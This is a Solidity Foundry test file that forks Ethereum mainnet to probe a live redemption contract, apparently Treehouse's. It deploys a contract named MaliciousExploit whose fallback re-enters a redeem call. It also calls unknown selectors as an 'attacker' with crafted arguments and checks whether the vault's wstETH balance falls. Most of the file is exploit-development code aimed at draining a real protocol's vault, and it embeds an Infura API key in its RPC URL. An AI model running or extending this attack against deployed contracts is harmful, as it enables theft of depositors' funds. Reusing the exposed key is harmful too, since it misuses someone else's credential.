// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract MaliciousExploit {
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    
    // Fallback that tries to exploit
    fallback() external payable {
        // Try to call RC.redeem
        assembly {
            let amount := 100000000000000000000 // 100e18
            let to := caller()
            
            // Encode redeem(uint256,address) call
            mstore(0x00, 0x7bde82f200000000000000000000000000000000000000000000000000000000)
            mstore(0x04, amount)
            mstore(0x24, to)
            
            let success := call(gas(), 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510, 0, 0x00, 0x44, 0x00, 0x00)
        }
    }
}

contract TraceFunctionCalls is Test {
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_TraceFunction0x900fd1ed() public view {
        console.log("=== TRACING 0x900fd1ed ===\n");

        // This function succeeded - let's understand what it does

        // First, try to identify it
        bytes4 sel = bytes4(0x900fd1ed);

        // Common functions that might match
        console.log("Checking known function signatures:");
        console.log("UNDERLYING():");
        console.logBytes4(bytes4(keccak256("UNDERLYING()")));
        console.log("underlying():");
        console.logBytes4(bytes4(keccak256("underlying()")));
        console.log("asset():");
        console.logBytes4(bytes4(keccak256("asset()")));
        console.log("token():");
        console.logBytes4(bytes4(keccak256("token()")));
        console.log("wstETH():");
        console.logBytes4(bytes4(keccak256("wstETH()")));

        // Call it and see what it returns
        (bool success, bytes memory data) = REDEMPTION_0.staticcall(
            abi.encodeWithSelector(sel)
        );
        
        if (success) {
            console.log("\nReturned data length:", data.length);
            if (data.length == 32) {
                console.logBytes32(bytes32(data));
                address addr = abi.decode(data, (address));
                if (addr != address(0) && addr.code.length > 0) {
                    console.log("Returns address:", addr);
                }
            }
        }
    }

    function test_TraceFunction0xa82b69ff() public view {
        console.log("=== TRACING 0xa82b69ff ===\n");

        bytes4 sel = bytes4(0xa82b69ff);

        (bool success, bytes memory data) = REDEMPTION_0.staticcall(
            abi.encodeWithSelector(sel)
        );
        
        if (success) {
            console.log("Returned data length:", data.length);
            if (data.length == 32) {
                console.logBytes32(bytes32(data));
            }
        }
    }

    function test_TraceFunction0x196e6b1d() public view {
        console.log("=== TRACING 0x196e6b1d ===\n");

        bytes4 sel = bytes4(0x196e6b1d);

        (bool success, bytes memory data) = REDEMPTION_0.staticcall(
            abi.encodeWithSelector(sel)
        );
        
        if (success) {
            console.log("Returned data length:", data.length);
            if (data.length == 32) {
                console.logBytes32(bytes32(data));
            }
        }
    }

    function test_DetailedTrace() public {
        console.log("=== DETAILED TRACE ===\n");

        vm.startPrank(attacker);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);

        // Deploy malicious contract
        MaliciousExploit exploit = new MaliciousExploit();
        console.log("Exploit contract:", address(exploit));

        // Enable verbose logging
        vm.recordLogs();

        // Call 0x900fd1ed with exploit address
        console.log("\nCalling 0x900fd1ed with exploit address...");
        (bool success, bytes memory retData) = REDEMPTION_0.call(
            abi.encodeWithSelector(bytes4(0x900fd1ed), address(exploit))
        );
        console.log("Success:", success);
        if (retData.length > 0) {
            console.log("Return data:");
            console.logBytes(retData);
        }

        // Check logs
        Vm.Log[] memory logs = vm.getRecordedLogs();
        console.log("\nEmitted logs:", logs.length);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault balance change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker balance change:", int256(attackerAfter) - int256(attackerBefore));
    }

    function test_TryWriteFunctions() public {
        console.log("=== TRYING WRITE FUNCTIONS ===\n");

        // The functions that succeed might be view functions
        // Let's look for actual state-changing functions

        vm.startPrank(attacker);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Try functions that might trigger delegatecall with different params
        bytes4[] memory candidates = new bytes4[](5);
        candidates[0] = bytes4(0xed45b661); // Unknown
        candidates[1] = bytes4(0xb2118a8d); // Unknown  
        candidates[2] = bytes4(0xcff50c6e); // Unknown
        candidates[3] = bytes4(0x04824e70); // Unknown
        candidates[4] = bytes4(0x192a8e86); // Unknown

        for (uint i = 0; i < candidates.length; i++) {
            console.log("\nTrying selector:");
            console.logBytes4(candidates[i]);

            // Try with no args
            (bool success, ) = REDEMPTION_0.call{gas: 1000000}(
                abi.encodeWithSelector(candidates[i])
            );
            console.log("  No args:", success);

            // Try with (uint256)
            (success, ) = REDEMPTION_0.call{gas: 1000000}(
                abi.encodeWithSelector(candidates[i], uint256(100e18))
            );
            console.log("  (uint256):", success);

            // Try with (address)
            (success, ) = REDEMPTION_0.call{gas: 1000000}(
                abi.encodeWithSelector(candidates[i], attacker)
            );
            console.log("  (address):", success);
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** VAULT BALANCE CHANGED! ***");
        }
    }

    function test_MatchUnknownSelectors() public pure {
        console.log("=== MATCHING UNKNOWN SELECTORS ===\n");

        // Let's try to match the unknown selectors
        bytes4 target1 = bytes4(0x900fd1ed);
        bytes4 target2 = bytes4(0xa82b69ff);
        bytes4 target3 = bytes4(0x196e6b1d);
        bytes4 target4 = bytes4(0xed45b661);
        bytes4 target5 = bytes4(0xb2118a8d);

        // Common function patterns
        string[40] memory funcs = [
            "UNDERLYING()",
            "underlying()",
            "getUnderlying()",
            "asset()",
            "getAsset()",
            "token()",
            "getToken()",
            "wstETH()",
            "tETH()",
            "getTETH()",
            "conversionRate()",
            "getConversionRate()",
            "exchangeRate()",
            "getExchangeRate()",
            "rate()",
            "getRate()",
            "currentRate()",
            "totalPending()",
            "getTotalPending()",
            "pendingAmount()",
            "getPendingAmount()",
            "redemptionQueue()",
            "getRedemptionQueue()",
            "queueLength()",
            "getQueueLength()",
            "nextRedemption()",
            "getNextRedemption()",
            "epoch()",
            "currentEpoch()",
            "getEpoch()",
            "epochData()",
            "getEpochData()",
            "epochCap()",
            "getEpochCap()",
            "remainingCap()",
            "getRemainingCap()",
            "availableCap()",
            "getAvailableCap()",
            "updateEpoch()",
            "rollEpoch()"
        ];

        for (uint i = 0; i < 40; i++) {
            bytes4 sel = bytes4(keccak256(bytes(funcs[i])));
            if (sel == target1 || sel == target2 || sel == target3 || sel == target4 || sel == target5) {
                console.log("MATCH:", funcs[i]);
                console.logBytes4(sel);
            }
        }

        // More specific to Treehouse
        console.log("\nTreehouse-specific:");
        console.log("TASSET():"); console.logBytes4(bytes4(keccak256("TASSET()")));
        console.log("tAsset():"); console.logBytes4(bytes4(keccak256("tAsset()")));
        console.log("getTAsset():"); console.logBytes4(bytes4(keccak256("getTAsset()")));
    }
}
